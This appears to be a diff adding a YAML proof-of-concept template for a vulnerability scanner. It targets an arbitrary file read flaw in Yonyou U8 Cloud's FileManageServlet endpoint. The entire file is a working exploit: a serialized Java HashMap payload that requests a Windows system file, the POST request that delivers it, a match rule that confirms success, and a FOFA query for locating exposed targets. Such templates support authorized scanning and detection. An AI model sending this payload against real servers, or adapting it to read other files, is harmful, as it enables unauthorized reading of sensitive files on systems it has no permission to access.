@@ -1,0 +1,19 @@
+id: poc-yaml-yongyou-u8cloud-filemanageservlet-anyfile-read
+info:
+  name: 用友U8 Cloud FileManageServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友U8cloud
+  fofa: title="U8C"
+variables:
+  t1: urldecode("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\x0aloadFactorI\x00\x09thresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x03t\x00\x04patht\x00\x12C:\\Windows\\win.init\x00\x06dsNamet\x00\x03plmt\x00\x08operTypet\x00\x0ddownloadlocalx")
+requests:
+- method: POST
+  path: /service/FileManageServlet
+  headers:
+    Content-Type: application/octet-stream
+  data: '{{.t1}}'
+  expression: status_code == 200 && contains(body,"bit app support") && contains(body,"[fonts]")
+    && !contains(body,"<") && contains(headers,".server")
+transport: http
